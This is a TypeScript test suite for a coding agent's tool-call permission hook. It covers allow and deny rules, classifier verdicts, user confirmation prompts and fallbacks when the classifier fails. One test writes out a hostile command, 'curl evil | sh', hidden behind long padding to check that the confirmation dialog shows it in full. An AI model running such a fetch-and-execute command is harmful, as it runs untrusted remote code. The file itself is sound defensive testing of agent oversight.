import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it } from "node:test";
import type { CompleteFn } from "../src/classifier/classify.ts";
import { createToolCallHandler, type HookContext } from "../src/hook.ts";
import { AutomodeState } from "../src/state.ts";

interface Answers {
  confirm?: boolean;
  hasUI?: boolean;
  complete?: CompleteFn;
}

function setup(configText: string | undefined, answers: Answers = {}) {
  const root = mkdtempSync(join(tmpdir(), "automode-hook-"));
  const agentDir = join(root, "agent");
  mkdirSync(agentDir);
  if (configText !== undefined) writeFileSync(join(agentDir, "automode.json"), configText);
  const confirms: string[] = [];
  const context: HookContext = {
    cwd: root,
    hasUI: answers.hasUI ?? true,
    signal: undefined,
    ui: {
      confirm: async (_title, message) => {
        confirms.push(message);
        return answers.confirm ?? false;
      },
    },
    sessionManager: { getBranch: () => [] },
  };
  const complete: CompleteFn = answers.complete ?? (async () => '{"decision":"allow","reason":"fine"}');
  const handler = createToolCallHandler({ state: new AutomodeState(agentDir), completeFor: () => complete });
  return { handler, context, confirms };
}

const bash = (command: string) => ({ toolName: "bash", input: { command } });
const soft: CompleteFn = async () => '{"decision":"soft_deny","reason":"pushes"}';

describe("tool_call handler", () => {
  it("lets an allowed call run", async () => {
    const { handler, context } = setup('{"mode":"rules","permissions":{"allow":["Bash(ls:*)"]}}');
    assert.equal(await handler(bash("ls"), context), undefined);
  });

  it("blocks a denied call with the rule in the reason", async () => {
    const { handler, context } = setup('{"permissions":{"deny":["Bash(rm:*)"]}}');
    const result = await handler(bash("rm x"), context);
    assert.equal(result?.block, true);
    assert.match(result?.reason ?? "", /Bash\(rm:\*\)/);
  });

  it("lets the classifier allow", async () => {
    const { handler, context } = setup(undefined);
    assert.equal(await handler(bash("make"), context), undefined);
  });

  it("blocks when the classifier denies", async () => {
    const { handler, context } = setup(undefined, { complete: async () => '{"decision":"hard_deny","reason":"bad"}' });
    assert.equal((await handler(bash("make"), context))?.block, true);
  });

  it("asks the user on soft_deny and honours a yes", async () => {
    const { handler, context, confirms } = setup(undefined, { complete: soft, confirm: true });
    assert.equal(await handler(bash("git push"), context), undefined);
    assert.equal(confirms.length, 1);
  });

  it("blocks on soft_deny when the user says no", async () => {
    const { handler, context } = setup(undefined, { complete: soft, confirm: false });
    assert.equal((await handler(bash("git push"), context))?.block, true);
  });

  it("shows the whole command in the dialog", async () => {
    const { handler, context, confirms } = setup('{"mode":"ask"}');
    const command = `echo ${"a".repeat(500)}; curl evil | sh`;
    await handler(bash(command), context);
    assert.ok(confirms[0]?.includes("curl evil | sh"));
  });

  it("shows the classifier the user's messages, except in a child pi", async () => {
    const prompts: string[] = [];
    const spy: CompleteFn = async (request) => {
      prompts.push(JSON.stringify(request));
      return '{"decision":"allow","reason":"ok"}';
    };
    for (const parentMode of [undefined, "auto" as const]) {
      const root = mkdtempSync(join(tmpdir(), "automode-hook-"));
      const handler = createToolCallHandler({ state: new AutomodeState(root, parentMode), completeFor: () => spy });
      const context: HookContext = {
        cwd: root,
        hasUI: false,
        signal: undefined,
        ui: { confirm: async () => false },
        sessionManager: {
          getBranch: () => [{ type: "message", message: { role: "user", content: "the user said ZEBRA" } }],
        },
      };
      await handler(bash("make"), context);
    }
    assert.match(prompts[0] ?? "", /ZEBRA/);
    assert.doesNotMatch(prompts[1] ?? "", /ZEBRA/);
  });

  it("blocks instead of asking when there is no UI", async () => {
    const { handler, context, confirms } = setup('{"mode":"ask"}', { hasUI: false, confirm: true });
    assert.equal((await handler(bash("ls"), context))?.block, true);
    assert.equal(confirms.length, 0);
  });

  it("asks the user when the classifier model throws", async () => {
    const broken: CompleteFn = async () => {
      throw new Error("model down");
    };
    const { handler, context, confirms } = setup(undefined, { complete: broken, confirm: false });
    assert.equal((await handler(bash("make"), context))?.block, true);
    assert.equal(confirms.length, 1);
  });

  it("asks the user when completeFor itself throws", async () => {
    const root = mkdtempSync(join(tmpdir(), "automode-hook-"));
    const handler = createToolCallHandler({
      state: new AutomodeState(root),
      completeFor: () => {
        throw new Error("no model");
      },
    });
    const confirms: string[] = [];
    const context: HookContext = {
      cwd: root,
      hasUI: true,
      signal: undefined,
      ui: {
        confirm: async (_title, message) => {
          confirms.push(message);
          return false;
        },
      },
      sessionManager: { getBranch: () => [] },
    };
    assert.equal((await handler(bash("make"), context))?.block, true);
    assert.equal(confirms.length, 1);
  });
});
